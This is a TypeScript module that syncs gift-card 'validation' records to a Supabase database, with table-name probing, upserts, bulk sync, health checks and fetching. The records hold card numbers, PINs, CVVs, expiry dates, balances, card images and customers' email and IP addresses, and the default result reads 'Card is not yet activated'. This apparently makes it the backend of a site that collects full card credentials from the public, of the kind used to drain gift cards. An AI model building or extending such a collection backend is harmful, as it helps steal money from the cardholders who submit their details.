import { createClient, SupabaseClient } from '@supabase/supabase-js';

const TABLE_CANDIDATES = [
  process.env.SUPABASE_TABLE_NAME,
  'GiftCardValidationpin',
  'gift_card_validations',
  'GiftCardValidation',
  'giftcardvalidations',
  'giftcardvalidation',
  'allcardstatus',
  'allcardvault',
  'allcardstation',
].filter(Boolean) as string[];

let supabaseClient: SupabaseClient | null = null;
let activeTableName: string | null = null;
let lastConnectionCheckFailed = false;
let lastFailureTimestamp = 0;

/**
 * Validates if Supabase URL and Key are properly configured with real, valid formats.
 */
export function isSupabaseConfigured(): boolean {
  const rawUrl = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL;
  const rawKey =
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    process.env.SUPABASE_KEY ||
    process.env.VITE_SUPABASE_ANON_KEY ||
    process.env.VITE_SUPABASE_KEY;

  if (!rawUrl || !rawKey) return false;

  const url = rawUrl.trim();
  const key = rawKey.trim();

  if (!url || !key || key.length < 10) return false;
  if (url.includes('your-project') || url.includes('placeholder') || url.includes('example.supabase.co')) {
    return false;
  }

  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
  } catch {
    return false;
  }
}

/**
 * Returns an initialized Supabase Client, or null if unconfigured/invalid.
 */
export function getSupabaseClient(): SupabaseClient | null {
  if (!isSupabaseConfigured()) {
    return null;
  }

  if (supabaseClient) return supabaseClient;

  const url = (process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || '').trim();
  const key = (
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    process.env.SUPABASE_KEY ||
    process.env.VITE_SUPABASE_ANON_KEY ||
    process.env.VITE_SUPABASE_KEY ||
    ''
  ).trim();

  try {
    supabaseClient = createClient(url, key, {
      auth: {
        persistSession: false,
        autoRefreshToken: false,
      },
      global: {
        headers: {
          'x-application-name': 'allcardstatus-server',
        },
      },
    });
    return supabaseClient;
  } catch (error) {
    console.warn('[Supabase] Failed to initialize client:', error instanceof Error ? error.message : error);
    return null;
  }
}

async function getActiveTableName(client: SupabaseClient): Promise<string> {
  if (activeTableName) return activeTableName;

  if (process.env.SUPABASE_TABLE_NAME) {
    activeTableName = process.env.SUPABASE_TABLE_NAME.trim();
    return activeTableName;
  }

  // If recent network check failed within the last 60 seconds, avoid probing all candidates
  const now = Date.now();
  if (lastConnectionCheckFailed && now - lastFailureTimestamp < 60000) {
    return 'GiftCardValidationpin';
  }

  for (const candidate of TABLE_CANDIDATES) {
    try {
      const { error } = await client.from(candidate).select('id').limit(1);
      if (!error) {
        activeTableName = candidate;
        lastConnectionCheckFailed = false;
        console.log(`[Supabase] Using active table: ${candidate}`);
        return candidate;
      }
    } catch {
      lastConnectionCheckFailed = true;
      lastFailureTimestamp = Date.now();
      break;
    }
  }

  return 'GiftCardValidationpin';
}

export function formatRecordForSupabase(v: any, tableName: string = ''): any {
  let imagesArray: string[] = [];
  if (Array.isArray(v.images)) {
    imagesArray = v.images.filter((img: any) => typeof img === 'string' && img.trim().length > 0);
  } else if (typeof v.images === 'string') {
    try {
      const parsed = JSON.parse(v.images);
      imagesArray = Array.isArray(parsed) ? parsed : [];
    } catch {
      imagesArray = [];
    }
  }

  const isGiftCardValidationpin =
    tableName.toLowerCase().includes('validationpin') ||
    tableName.includes('GiftCardValidationpin');

  if (isGiftCardValidationpin) {
    return {
      id: v.id,
      brand: v.brand || 'Unknown',
      cardNumber: v.cardNumber || v.card_number || '',
      pin: v.pin || null,
      status: v.status || 'PENDING',
      result: v.result || 'Validation pending',
      createdAt: v.createdAt ? new Date(v.createdAt).toISOString() : new Date().toISOString(),
      updatedAt: v.updatedAt ? new Date(v.updatedAt).toISOString() : new Date().toISOString(),
      currency: v.currency || 'USD',
      cardAmount: typeof v.cardAmount === 'number' ? v.cardAmount : (parseFloat(v.card_amount) || 0.0),
      cvv: v.cvv || null,
      expiryDate: v.expiryDate || v.expiry_date || null,
      images: imagesArray,
    };
  }

  return {
    id: v.id,
    brand: v.brand,
    card_number: v.cardNumber || v.card_number,
    pin: v.pin || null,
    cvv: v.cvv || null,
    expiry_date: v.expiryDate || v.expiry_date || null,
    card_amount: typeof v.cardAmount === 'number' ? v.cardAmount : (parseFloat(v.card_amount) || 0.0),
    currency: v.currency || 'USD',
    status: v.status || 'PENDING',
    result: v.result || null,
    notes: v.notes || null,
    customer_email: v.customerEmail || v.customer_email || null,
    customer_ip: v.customerIp || v.customer_ip || null,
    images: imagesArray,
    created_at: v.createdAt ? new Date(v.createdAt).toISOString() : new Date().toISOString(),
    updated_at: v.updatedAt ? new Date(v.updatedAt).toISOString() : new Date().toISOString(),
  };
}

/**
 * Pushes a single validation record to the Supabase database.
 * Does not throw error, returns structured result so application flow is never disrupted.
 */
export async function pushValidationToSupabase(record: any): Promise<{
  synced: boolean;
  message?: string;
  error?: string;
  tableMissing?: boolean;
}> {
  const client = getSupabaseClient();
  if (!client) {
    return {
      synced: false,
      message: 'Supabase credentials not configured in environment. Record saved locally.',
    };
  }

  try {
    const tableName = await getActiveTableName(client);
    const payload = formatRecordForSupabase(record, tableName);
    const { error } = await client
      .from(tableName)
      .upsert(payload, { onConflict: 'id' });

    if (error) {
      const isTableMissing =
        error.message?.includes('schema cache') ||
        error.message?.includes('relation') ||
        error.message?.includes('does not exist');

      const userFriendlyMessage = isTableMissing
        ? `The table '${tableName}' was not found in your Supabase project. Please execute the CREATE TABLE script in Supabase SQL Editor.`
        : error.message;

      return {
        synced: false,
        error: userFriendlyMessage,
        tableMissing: isTableMissing,
      };
    }

    lastConnectionCheckFailed = false;
    return {
      synced: true,
      message: `Successfully synced to Supabase table ${tableName}.`,
    };
  } catch (err: any) {
    lastConnectionCheckFailed = true;
    lastFailureTimestamp = Date.now();
    const isFetchFail = err?.message?.includes('fetch failed') || err?.name === 'TypeError';
    const errorMsg = isFetchFail
      ? 'Supabase remote host unreachable or offline. Record saved locally in database.'
      : err?.message || 'Error connecting to Supabase';

    return {
      synced: false,
      error: errorMsg,
      tableMissing: false,
    };
  }
}

/**
 * Bulk syncs an array of validation records to Supabase.
 */
export async function bulkSyncValidationsToSupabase(records: any[]): Promise<{
  success: boolean;
  syncedCount: number;
  totalCount: number;
  error?: string;
  configured: boolean;
  tableMissing?: boolean;
}> {
  const client = getSupabaseClient();
  if (!client) {
    return {
      success: false,
      syncedCount: 0,
      totalCount: records.length,
      configured: false,
      error: 'Supabase credentials are not configured yet. Add SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY in environment variables.',
    };
  }

  if (!records || records.length === 0) {
    return {
      success: true,
      syncedCount: 0,
      totalCount: 0,
      configured: true,
    };
  }

  try {
    const tableName = await getActiveTableName(client);
    const formattedRecords = records.map((r) => formatRecordForSupabase(r, tableName));
    const { error } = await client
      .from(tableName)
      .upsert(formattedRecords, { onConflict: 'id' });

    if (error) {
      const isTableMissing =
        error.message?.includes('schema cache') ||
        error.message?.includes('relation') ||
        error.message?.includes('does not exist');

      const userFriendlyMessage = isTableMissing
        ? `Table '${tableName}' does not exist in your Supabase database. Please create the table in Supabase SQL Editor.`
        : error.message;

      return {
        success: false,
        syncedCount: 0,
        totalCount: records.length,
        configured: true,
        tableMissing: isTableMissing,
        error: userFriendlyMessage,
      };
    }

    lastConnectionCheckFailed = false;
    return {
      success: true,
      syncedCount: records.length,
      totalCount: records.length,
      configured: true,
    };
  } catch (err: any) {
    lastConnectionCheckFailed = true;
    lastFailureTimestamp = Date.now();
    const isFetchFail = err?.message?.includes('fetch failed') || err?.name === 'TypeError';
    return {
      success: false,
      syncedCount: 0,
      totalCount: records.length,
      configured: true,
      tableMissing: false,
      error: isFetchFail
        ? 'Cannot reach Supabase instance (fetch failed). Please check your SUPABASE_URL.'
        : err?.message || 'Failed to sync batch to Supabase',
    };
  }
}

/**
 * Checks the real-time health and table readiness of Supabase.
 */
export async function checkSupabaseHealth(): Promise<{
  configured: boolean;
  url: string | null;
  tableReady: boolean;
  message: string;
}> {
  const isConfigured = isSupabaseConfigured();
  const url = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || null;

  if (!isConfigured) {
    return {
      configured: false,
      url,
      tableReady: false,
      message: 'Supabase credentials (SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY) are not configured.',
    };
  }

  const client = getSupabaseClient();
  if (!client) {
    return {
      configured: false,
      url,
      tableReady: false,
      message: 'Invalid Supabase URL or configuration.',
    };
  }

  try {
    const tableName = await getActiveTableName(client);
    const { error } = await client
      .from(tableName)
      .select('id')
      .limit(1);

    if (error) {
      const isTableMissing =
        error.message?.includes('schema cache') ||
        error.message?.includes('relation') ||
        error.message?.includes('does not exist');

      return {
        configured: true,
        url,
        tableReady: false,
        message: isTableMissing
          ? `Supabase connected, but table '${tableName}' has not been created yet in your Supabase project.`
          : `Supabase notice: ${error.message}`,
      };
    }

    lastConnectionCheckFailed = false;
    return {
      configured: true,
      url,
      tableReady: true,
      message: `Supabase connected and table '${tableName}' is active and ready.`,
    };
  } catch (err: any) {
    lastConnectionCheckFailed = true;
    lastFailureTimestamp = Date.now();
    const isFetchFail = err?.message?.includes('fetch failed') || err?.name === 'TypeError';
    return {
      configured: true,
      url,
      tableReady: false,
      message: isFetchFail
        ? 'Unable to connect to Supabase remote server (network/fetch error). Local SQLite database is active.'
        : err?.message || 'Error checking Supabase table status.',
    };
  }
}

/**
 * Fetches all saved validation records directly from Supabase.
 */
export async function fetchValidationsFromSupabase(): Promise<any[]> {
  const client = getSupabaseClient();
  if (!client || !isSupabaseConfigured()) return [];

  try {
    const tableName = await getActiveTableName(client);
    const { data, error } = await client
      .from(tableName)
      .select('*')
      .order('created_at', { ascending: false });

    if (error || !Array.isArray(data)) return [];

    lastConnectionCheckFailed = false;
    return data.map((row) => {
      let imagesArr: string[] = [];
      try {
        if (typeof row.images === 'string') {
          imagesArr = JSON.parse(row.images);
        } else if (Array.isArray(row.images)) {
          imagesArr = row.images;
        }
      } catch {
        imagesArr = [];
      }

      return {
        id: String(row.id || ''),
        brand: String(row.brand || 'Gift Card'),
        cardNumber: String(row.card_number || row.cardNumber || ''),
        pin: row.pin ? String(row.pin) : null,
        cvv: row.cvv ? String(row.cvv) : null,
        expiryDate: row.expiry_date || row.expiryDate ? String(row.expiry_date || row.expiryDate) : null,
        currency: String(row.currency || 'USD'),
        cardAmount: Number(row.card_amount || row.cardAmount || 0),
        status: String(row.status || 'PENDING'),
        result: String(row.result || 'Card is not yet activated'),
        notes: row.notes ? String(row.notes) : null,
        customerEmail: row.customer_email || row.customerEmail ? String(row.customer_email || row.customerEmail) : null,
        customerIp: row.customer_ip || row.customerIp ? String(row.customer_ip || row.customerIp) : null,
        images: JSON.stringify(imagesArr),
        createdAt: row.created_at ? new Date(row.created_at) : new Date(),
        updatedAt: row.updated_at ? new Date(row.updated_at) : new Date(),
      };
    });
  } catch (err: any) {
    lastConnectionCheckFailed = true;
    lastFailureTimestamp = Date.now();
    // Silent failover to local database
    return [];
  }
}
